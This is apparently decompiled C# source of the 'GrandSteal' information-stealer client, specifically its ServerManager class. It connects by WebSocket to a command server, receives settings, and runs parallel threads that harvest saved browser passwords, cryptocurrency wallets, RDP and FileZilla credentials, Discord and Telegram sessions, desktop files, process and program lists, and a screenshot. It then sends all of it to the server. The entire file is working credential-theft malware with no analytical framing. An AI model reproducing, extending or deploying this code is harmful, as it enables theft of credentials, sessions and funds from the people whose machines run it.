using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using GrandSteal.Client.Data.Recovery;
using GrandSteal.Client.Models;
using GrandSteal.Client.Models.Credentials;
using GrandSteal.Client.Models.Extensions;
using GrandSteal.Client.Models.Extensions.Nulls;
using GrandSteal.SharedModels;
using GrandSteal.SharedModels.Communication;
using GrandSteal.SharedModels.Models;
using ProtoBuf.Meta;
using SuperSocket.ClientEngine;
using WebSocket4Net;

namespace GrandSteal.Client.Data.Server
{
	// Token: 0x0200000D RID: 13
	public class ServerManager
	{
		// Token: 0x17000014 RID: 20
		// (get) Token: 0x06000041 RID: 65 RVA: 0x0000228F File Offset: 0x0000048F
		public Dictionary<Func<RequestBase, bool>, Action<RequestBase, WebSocket>> Handlers
		{
			[CompilerGenerated]
			get
			{
				return this.<Handlers>k__BackingField;
			}
		}

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x06000042 RID: 66 RVA: 0x00002297 File Offset: 0x00000497
		public string Host
		{
			[CompilerGenerated]
			get
			{
				return this.<Host>k__BackingField;
			}
		}

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x06000043 RID: 67 RVA: 0x0000229F File Offset: 0x0000049F
		public WebSocket Server
		{
			[CompilerGenerated]
			get
			{
				return this.<Server>k__BackingField;
			}
		}

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x06000044 RID: 68 RVA: 0x000022A7 File Offset: 0x000004A7
		// (set) Token: 0x06000045 RID: 69 RVA: 0x000022AF File Offset: 0x000004AF
		public bool Running
		{
			get;
			private set;
		}

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x06000046 RID: 70 RVA: 0x000022B8 File Offset: 0x000004B8
		public IList<ICredentialsManager<BrowserProfile>> BrowserCredentialsManagers
		{
			[CompilerGenerated]
			get
			{
				return this.<BrowserCredentialsManagers>k__BackingField;
			}
		}

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x06000047 RID: 71 RVA: 0x000022C0 File Offset: 0x000004C0
		public IList<ICredentialsManager<ColdWallet>> ColdWalletManagers
		{
			[CompilerGenerated]
			get
			{
				return this.<ColdWalletManagers>k__BackingField;
			}
		}

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x06000048 RID: 72 RVA: 0x000022C8 File Offset: 0x000004C8
		public IList<ICredentialsManager<RdpCredential>> RdpManagers
		{
			[CompilerGenerated]
			get
			{
				return this.<RdpManagers>k__BackingField;
			}
		}

		// Token: 0x1700001B RID: 27
		// (get) Token: 0x06000049 RID: 73 RVA: 0x000022D0 File Offset: 0x000004D0
		public IList<ICredentialsManager<FtpCredential>> FtpManagers
		{
			[CompilerGenerated]
			get
			{
				return this.<FtpManagers>k__BackingField;
			}
		}

		// Token: 0x1700001C RID: 28
		// (get) Token: 0x0600004A RID: 74 RVA: 0x000022D8 File Offset: 0x000004D8
		public IList<DesktopFileManager> DesktopFileManagers
		{
			[CompilerGenerated]
			get
			{
				return this.<DesktopFileManagers>k__BackingField;
			}
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00003C30 File Offset: 0x00001E30
		public ServerManager(string IP, string buildID)
		{
			ProtoHelper.PopulateTypes(typeof(RequestBase));
			ProtoHelper.PopulateTypes(typeof(ResponseBase));
			ProtoHelper.PopulateTypes(typeof(Request<CredentialsRequest>));
			ProtoHelper.PopulateTypes(typeof(Request<string>));
			ProtoHelper.PopulateTypes(typeof(Response<bool>));
			ProtoHelper.PopulateTypes(typeof(Response<GrandSteal.Client.Models.ClientSettings>));
			RuntimeTypeModel.Default.AutoAddMissingTypes = true;
			RuntimeTypeModel.Default.AutoCompile = false;
			RuntimeTypeModel.Default.CompileInPlace();
			this.<BrowserCredentialsManagers>k__BackingField = new List<ICredentialsManager<BrowserProfile>>
			{
				new ChromiumManager(),
				new GeckoManager()
			};
			this.<ColdWalletManagers>k__BackingField = new List<ICredentialsManager<ColdWallet>>
			{
				new ColdWalletManager()
			};
			this.<RdpManagers>k__BackingField = new List<ICredentialsManager<RdpCredential>>
			{
				new RdpManager()
			};
			this.<FtpManagers>k__BackingField = new List<ICredentialsManager<FtpCredential>>
			{
				new FileZillaManager()
			};
			this.<DesktopFileManagers>k__BackingField = new List<DesktopFileManager>
			{
				new DesktopFileManager()
			};
			this.BuildID = buildID;
			this.<Handlers>k__BackingField = new Dictionary<Func<RequestBase, bool>, Action<RequestBase, WebSocket>>();
			this.<Host>k__BackingField = string.Format("ws://{0}:{1}/websocket", IP, 2012);
			this.<Server>k__BackingField = new WebSocket(this.Host)
			{
				AutoSendPingInterval = 5000,
				EnableAutoSendPing = true,
				AllowUnstrustedCertificate = true
			};
			this.InitializeServer();
			Console.WriteLine("Server is initialized");
		}

		// Token: 0x0600004C RID: 76 RVA: 0x000022E0 File Offset: 0x000004E0
		public AsyncAction<bool> Start()
		{
			return AsyncTask.StartNew<bool>(delegate
			{
				this.Server.Open();
				Console.WriteLine("Opening");
				while (!this.Running)
				{
					Thread.Sleep(100);
				}
				return true;
			});
		}

		// Token: 0x0600004D RID: 77 RVA: 0x000022F3 File Offset: 0x000004F3
		public void HandleWorkCompleted()
		{
			EventHandler expr_06 = this.OnWorkCompleted;
			if (expr_06 == null)
			{
				return;
			}
			expr_06(this, null);
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00003E18 File Offset: 0x00002018
		private void InitializeServer()
		{
			this.Running = false;
			this.Server.DataReceived += delegate(object sender, WebSocket4Net.DataReceivedEventArgs e)
			{
				try
				{
					if (e.Data.IsNotNull<byte[]>() && e.Data.Length != 0)
					{
						CommunicationObject communicationObject = e.Data.DeSerializeProto<CommunicationObject>();
						RequestBase requestBase;
						if ((requestBase = (communicationObject as RequestBase)) != null)
						{
							foreach (KeyValuePair<Func<RequestBase, bool>, Action<RequestBase, WebSocket>> current in this.Handlers)
							{
								if (current.Key(requestBase))
								{
									current.Value(requestBase, this.Server);
								}
							}
						}
						ResponseBase response;
						if ((response = (communicationObject as ResponseBase)) != null)
						{
							response.HandleResponse();
						}
					}
				}
				catch (Exception arg)
				{
					Console.WriteLine("Invalid JsonMessage data from server. Exception : " + arg);
				}
			};
			this.Server.Opened += delegate(object sender, EventArgs e)
			{
				this.Running = true;
			};
			WebSocket arg_5A_0 = this.Server;
			EventHandler<MessageReceivedEventArgs> arg_5A_1;
			if ((arg_5A_1 = ServerManager.<>c.<>9__33_2) == null)
			{
				arg_5A_1 = (ServerManager.<>c.<>9__33_2 = new EventHandler<MessageReceivedEventArgs>(ServerManager.<>c.<>9.<InitializeServer>b__33_2));
			}
			arg_5A_0.MessageReceived += arg_5A_1;
			WebSocket arg_84_0 = this.Server;
			EventHandler arg_84_1;
			if ((arg_84_1 = ServerManager.<>c.<>9__33_3) == null)
			{
				arg_84_1 = (ServerManager.<>c.<>9__33_3 = new EventHandler(ServerManager.<>c.<>9.<InitializeServer>b__33_3));
			}
			arg_84_0.Closed += arg_84_1;
			this.Server.Error += delegate(object sender, ErrorEventArgs e)
			{
				this.Running = false;
			};
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00003EC8 File Offset: 0x000020C8
		public bool SendCredentials()
		{
			bool result;
			try
			{
				GrandSteal.Client.Models.ClientSettings settings = this.RecieveSettings().IsNull(new GrandSteal.Client.Models.ClientSettings());
				List<BrowserProfile> browserProfiles = new List<BrowserProfile>();
				List<ColdWallet> wallets = new List<ColdWallet>();
				List<RdpCredential> rdpCredentials = new List<RdpCredential>();
				List<DesktopFile> desktopFiles = new List<DesktopFile>();
				List<FtpCredential> ftpCredentials = new List<FtpCredential>();
				TelegramSession telegramSession = new TelegramSession();
				DiscordSession discordSession = new DiscordSession();
				List<RemoteProcess> processes = new List<RemoteProcess>();
				List<string> programs = new List<string>();
				RemoteClientInformation clientInfo = new RemoteClientInformation();
				ThreadPool.SetMaxThreads(2000, 10000);
				new Thread(delegate
				{
					Console.WriteLine("ClientInfos parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					clientInfo = ClientInfoHelper.Create(this.BuildID);
					stopwatch.Stop();
					this.clientInfoFlag.Set();
					Console.WriteLine(string.Format("ClientInfos has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate
				{
					Console.WriteLine("Browsers parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					if (settings.GrabBrowserCredentials)
					{
						int countCompleted = 0;
						object locker = new object();
						using (IEnumerator<ICredentialsManager<BrowserProfile>> enumerator = this.BrowserCredentialsManagers.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								ICredentialsManager<BrowserProfile> manager = enumerator.Current;
								new Thread(delegate
								{
									List<BrowserProfile> all = manager.GetAll();
									object locker = locker;
									lock (locker)
									{
										browserProfiles.AddRange(all);
										int countCompleted = countCompleted;
										countCompleted++;
									}
								}).Start();
							}
						}
						while (countCompleted != this.BrowserCredentialsManagers.Count)
						{
						}
					}
					stopwatch.Stop();
					this.browsersFlag.Set();
					Console.WriteLine(string.Format("Browsers has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate
				{
					Console.WriteLine("ColdWallets parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					if (settings.GrabColdWallets)
					{
						foreach (ICredentialsManager<ColdWallet> current in this.ColdWalletManagers)
						{
							wallets.AddRange(current.GetAll().IsNull(new List<ColdWallet>()));
						}
					}
					stopwatch.Stop();
					this.walletsFlag.Set();
					Console.WriteLine(string.Format("ColdWallets has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate
				{
					Console.WriteLine("DiscordSession parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					if (settings.GrabDiscord)
					{
						discordSession = DiscordManager.Extract();
					}
					stopwatch.Stop();
					this.discordFlag.Set();
					Console.WriteLine(string.Format("DiscordSession has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate
				{
					Console.WriteLine("Rdps parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					if (settings.GrabRdp)
					{
						foreach (ICredentialsManager<RdpCredential> current in this.RdpManagers)
						{
							rdpCredentials.AddRange(current.GetAll().IsNull<List<RdpCredential>>());
						}
					}
					stopwatch.Stop();
					this.rdpsFlag.Set();
					Console.WriteLine(string.Format("Rdps has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate
				{
					Console.WriteLine("DesktopFiles parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					if (settings.GrabDesktopFiles)
					{
						foreach (DesktopFileManager current in this.DesktopFileManagers)
						{
							current.DesktopFileExtensions = settings.DesktopExtensions;
							desktopFiles.AddRange(current.GetAll());
						}
					}
					stopwatch.Stop();
					this.desktopFlag.Set();
					Console.WriteLine(string.Format("DesktopFiles has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate
				{
					Console.WriteLine("FTPs parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					if (settings.GrabFtp)
					{
						foreach (ICredentialsManager<FtpCredential> current in this.FtpManagers)
						{
							ftpCredentials.AddRange(current.GetAll().IsNull<List<FtpCredential>>());
						}
					}
					stopwatch.Stop();
					this.ftpFlag.Set();
					Console.WriteLine(string.Format("FTPs has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate
				{
					Console.WriteLine("TelegramSession parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					if (settings.GrabTelegram)
					{
						telegramSession = TelegramManager.Extract();
					}
					stopwatch.Stop();
					this.telegramFlag.Set();
					Console.WriteLine(string.Format("TelegramSession has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate
				{
					Console.WriteLine("ListOfProcesses parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					processes = ClientInfoHelper.ListOfProcesses();
					stopwatch.Stop();
					this.processesFlag.Set();
					Console.WriteLine(string.Format("ListOfProcesses has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				new Thread(delegate
				{
					Console.WriteLine("ListOfPrograms parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					programs = ClientInfoHelper.ListOfPrograms();
					stopwatch.Stop();
					this.programsFlag.Set();
					Console.WriteLine(string.Format("ListOfPrograms has been parsed.Elapsed time: {0}", stopwatch.Elapsed));
				}).Start();
				this.telegramFlag.WaitOne();
				this.discordFlag.WaitOne();
				this.processesFlag.WaitOne();
				this.programsFlag.WaitOne();
				this.browsersFlag.WaitOne();
				this.walletsFlag.WaitOne();
				this.rdpsFlag.WaitOne();
				this.desktopFlag.WaitOne();
				this.ftpFlag.WaitOne();
				this.clientInfoFlag.WaitOne();
				Console.WriteLine("CredentialsRequest has been created");
				if (clientInfo == null)
				{
					Environment.Exit(0);
				}
				CredentialsRequest objectToSend = new CredentialsRequest
				{
					ClientInformation = clientInfo,
					BrowserProfiles = browserProfiles,
					ColdWallets = wallets,
					RdpConnections = rdpCredentials,
					DesktopFiles = desktopFiles,
					FtpCredentials = ftpCredentials,
					Telegram = telegramSession,
					Discord = discordSession,
					ProcessList = processes,
					InstalledPrograms = programs,
					Screenshot = ClientInfoHelper.CaptureScreen()
				};
				result = this.Server.SendRequest(objectToSend, "Credentials", 600000)();
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000050 RID: 80 RVA: 0x000041AC File Offset: 0x000023AC
		public GrandSteal.Client.Models.ClientSettings RecieveSettings()
		{
			GrandSteal.Client.Models.ClientSettings clientSettings = this.Server.SendRequest("", "ParseClientSettings", 600000)();
			clientSettings.DesktopExtensions = (clientSettings.DesktopExtensions ?? new BindingList<string>());
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append("GrabBrowserCredentials: ").Append(clientSettings.GrabBrowserCredentials).AppendLine().Append("GrabColdWallets: ").Append(clientSettings.GrabColdWallets).AppendLine().Append("GrabDesktopFiles: ").Append(clientSettings.GrabDesktopFiles).AppendLine().Append("GrabFtp: ").Append(clientSettings.GrabFtp).AppendLine().Append("GrabRdp: ").Append(clientSettings.GrabRdp).AppendLine().Append("GrabDiscord: ").Append(clientSettings.GrabDiscord).AppendLine().Append("GrabTelegram: ").Append(clientSettings.GrabTelegram).AppendLine().Append("Extensions: ").AppendLine(string.Join(new string(new char[]
			{
				','
			}), clientSettings.DesktopExtensions.ToArray<string>()));
			Console.WriteLine(stringBuilder.ToString());
			return clientSettings.IsNull(new GrandSteal.Client.Models.ClientSettings());
		}

		// Token: 0x0400002A RID: 42
		public EventHandler OnWorkCompleted;

		// Token: 0x0400002B RID: 43
		private readonly string BuildID;

		// Token: 0x0400002C RID: 44
		private AutoResetEvent telegramFlag = new AutoResetEvent(false);

		// Token: 0x0400002D RID: 45
		private AutoResetEvent discordFlag = new AutoResetEvent(false);

		// Token: 0x0400002E RID: 46
		private AutoResetEvent processesFlag = new AutoResetEvent(false);

		// Token: 0x0400002F RID: 47
		private AutoResetEvent programsFlag = new AutoResetEvent(false);

		// Token: 0x04000030 RID: 48
		private AutoResetEvent browsersFlag = new AutoResetEvent(false);

		// Token: 0x04000031 RID: 49
		private AutoResetEvent walletsFlag = new AutoResetEvent(false);

		// Token: 0x04000032 RID: 50
		private AutoResetEvent rdpsFlag = new AutoResetEvent(false);

		// Token: 0x04000033 RID: 51
		private AutoResetEvent desktopFlag = new AutoResetEvent(false);

		// Token: 0x04000034 RID: 52
		private AutoResetEvent ftpFlag = new AutoResetEvent(false);

		// Token: 0x04000035 RID: 53
		private AutoResetEvent clientInfoFlag = new AutoResetEvent(false);

		// Token: 0x0200000E RID: 14
		[CompilerGenerated]
		[Serializable]
		private sealed class <>c
		{
			// Token: 0x06000057 RID: 87 RVA: 0x0000234E File Offset: 0x0000054E
			internal void <InitializeServer>b__33_2(object sender, MessageReceivedEventArgs e)
			{
				Console.WriteLine(e.Message);
			}

			// Token: 0x06000058 RID: 88 RVA: 0x0000235B File Offset: 0x0000055B
			internal void <InitializeServer>b__33_3(object sender, EventArgs e)
			{
				Environment.Exit(0);
			}

			// Token: 0x04000036 RID: 54
			public static readonly ServerManager.<>c <>9 = new ServerManager.<>c();

			// Token: 0x04000037 RID: 55
			public static EventHandler<MessageReceivedEventArgs> <>9__33_2;

			// Token: 0x04000038 RID: 56
			public static EventHandler <>9__33_3;
		}
	}
}
